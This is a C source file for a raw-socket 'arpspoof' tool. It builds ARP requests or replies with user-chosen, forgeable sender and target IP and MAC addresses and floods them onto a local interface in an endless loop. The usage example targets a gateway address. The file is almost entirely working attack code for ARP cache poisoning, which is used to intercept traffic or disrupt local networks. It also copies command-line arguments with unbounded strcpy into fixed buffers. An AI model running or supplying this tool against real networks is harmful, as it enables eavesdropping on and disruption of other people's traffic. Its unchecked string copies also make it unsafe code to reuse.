#include <net/if.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>
#include <errno.h>

#include "arp.h"

int mac_from_iface(const char* iface_name, struct ether_addr* ether_out)
{
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock < 0) {
		perror("socket()");
		return -1;
	}

	struct ifreq ifr;
	memset((void*) &ifr, 0, sizeof(ifr));

	strncpy(ifr.ifr_name, iface_name, sizeof(ifr.ifr_name));

	if (ioctl(sock, SIOCGIFHWADDR, (void*) &ifr) < 0) {
		perror("ioctl()");
		return -1;
	}

	memcpy(ether_out->ether_addr_octet, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	return 1;
}

int ip_from_iface(const char* iface_name, char* ip_buff){
	//Create an ifreq structure for passing data in and out of ioctl
	struct ifreq ifr;
	size_t iface_name_len=strlen(iface_name);
	if (iface_name_len<sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name,iface_name,iface_name_len);
		ifr.ifr_name[iface_name_len]=0;
	} else {
		printf("interface name is too long\n");
		return -1;
	}

	//Provide an open socket descriptor with the address family AF_INET
	int fd=socket(AF_INET,SOCK_DGRAM,0);
	if (fd==-1) {
		printf("%s\n",strerror(errno));
		return -1;
	}

	//Invoke ioctl
	if (ioctl(fd,SIOCGIFADDR,&ifr)==-1) {
		int temp_errno=errno;
		close(fd);
		printf("%s\n",strerror(temp_errno));
		return -1;
	}
	close(fd);

	//Extract the IP address from the ifreq structure
	struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
	//printf("IP address: %s\n",inet_ntoa(ipaddr->sin_addr));
	strcpy(ip_buff, inet_ntoa(ipaddr->sin_addr));
	return 0;
}

void usage()
{
	printf("Usage:\n");
	printf("    arpspoof -q/-p -i interface -Tip target_ip -Sip source_ip -Smac source_mac -Tmac target_mac [-l interval]\n");
	printf("Example:\n");
	printf("    arpspoof -q -i wlan0 -Sip 192.168.0.101 -Tip 192.168.0.1\n");
}

int main(int argc, char* argv[])
{
#define  arp_request   0
#define  arp_reply     1
#define  brdcast_mac   "ff:ff:ff:ff:ff:ff"
#define  zero_mac      "00:00:00:00:00:00"
#define  brdcast_ip    "255.255.255.255"

	//arp source and target ip
	char arp_src_ip[16]; /* e.g. '255.255.255.255'* = 15 chars + \0 = 16 chars */
	char arp_tar_ip[16];
	memset(arp_src_ip, 0, sizeof(arp_src_ip));
	memset(arp_tar_ip, 0, sizeof(arp_tar_ip));

	//arp source and target mac
	char arp_src_mac[18]; /* e.g. 'aa:bb:cc:11:22:33' = 17 chars + \0 = 18 chars */
	char arp_tar_mac[18];
	memset(arp_src_mac, 0, sizeof(arp_src_mac));
	memset(arp_tar_mac, 0, sizeof(arp_tar_mac));

	//ethernet source and destination mac
	char eth_des_mac[18];
	char eth_src_mac[18];
	memset(eth_src_mac, 0, sizeof(eth_src_mac));
	memset(eth_des_mac, 0, sizeof(eth_des_mac));

	int ifname_idx = -1;
	int arp_opcode = -1;
	int interval = -1;

	//parse parameters
	for (int i = 1; i < argc; i++) {
		if(strncmp(argv[i], "-i", 2) == 0){
			ifname_idx = ++i;
			printf("-i %s\n", argv[ifname_idx]);
		}else if(strncmp(argv[i], "-q", 2) == 0){
			arp_opcode = ARPOP_REQUEST;
			printf("arp request\n");
		}else if(strncmp(argv[i], "-p", 2) == 0){
			arp_opcode = ARPOP_REPLY;
			printf("arp reply\n");
		}else if(strncmp(argv[i], "-Sip", 4) == 0){
			strcpy(arp_src_ip, argv[++i]);
			printf("-Sip %s\n", arp_src_ip);
		}else if(strncmp(argv[i], "-Smac", 5) == 0){
			strcpy(arp_src_mac, argv[++i]);
			strcpy(eth_src_mac, arp_src_mac);
			printf("-Smac %s\n", arp_src_mac);
			printf("Ethernet SRC MAC: %s\n", eth_src_mac);
		}else if(strncmp(argv[i], "-Tip", 4) == 0){
			strcpy(arp_tar_ip, argv[++i]);
			printf("-Tip %s\n", arp_tar_ip);
		}else if(strncmp(argv[i], "-Tmac", 5) == 0){
			strcpy(arp_tar_mac, argv[++i]);
			strcpy(eth_des_mac, arp_tar_mac);
			printf("-Tmac %s\n", arp_tar_mac);
			printf("Ethernet DES MAC: %s\n", eth_des_mac);
		}else if(strncmp(argv[i], "-l", 2) == 0){
			interval = atoi(argv[++i]);
		}
	}

	if (interval < 0)
		interval = 1000;

	//Get the interface MAC address
	struct ether_addr iface_hwaddr;
	if (mac_from_iface(argv[ifname_idx], &iface_hwaddr) < 0) {
		return -1;
	}

	//Get the interface IP address
	char ip_buff[16]={0};
	if(ip_from_iface(argv[ifname_idx], ip_buff) < 0){
		return -1;
	}

	//check parameters
	if(strlen(arp_src_ip) == 0){
		strcpy(arp_src_ip, ip_buff);
		printf("-Sip %s\n", arp_src_ip);
	}
	if(strlen(arp_tar_ip) == 0){
		strcpy(arp_tar_ip, brdcast_ip);
		printf("-Tip %s\n", arp_tar_ip);
	}
	if(strlen(arp_src_mac) == 0){
		strncpy(arp_src_mac, ether_ntoa(&iface_hwaddr), sizeof(arp_src_mac));
		strcpy(eth_src_mac, arp_src_mac);
		printf("-Smac %s\n", arp_src_mac);
		printf("Ethernet SRC MAC: %s\n", eth_src_mac);
	}
	if(strlen(arp_tar_mac) == 0){
		strcpy(arp_tar_mac, zero_mac);
		strcpy(eth_des_mac, brdcast_mac);
		printf("-Tmac %s\n", arp_tar_mac);
		printf("Ethernet DES MAC: %s\n", eth_des_mac);
	}

	//Create ARP Packet
	struct arp_packet* arp;
	if((arp_opcode == ARPOP_REPLY) || (arp_opcode == ARPOP_REQUEST)){ 
		arp = create_arp_packet(eth_des_mac, eth_src_mac,
				arp_opcode, arp_src_mac, arp_src_ip, arp_tar_mac, arp_tar_ip);
	}else{
		usage();
		return -1;
	}

	//Create socket and send ARP packet
	int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0) {
		perror("socket()");
		return -1;
	}

	int if_idx = if_nametoindex(argv[ifname_idx]);
	if (if_idx == 0) {
		perror("if_nametoindex()");
		return -1;
	}

	printf("\n Start Sending ARP Packet, Packet Interval %d us \n", interval);
	long cnt=0;
	while (1) {
		if (send_arp_to(arp, sock, if_idx) > 0) {
			printf("\r send NO. %ld ARP packet", ++cnt);
		}
		usleep(interval);
	}
	return 0;
}
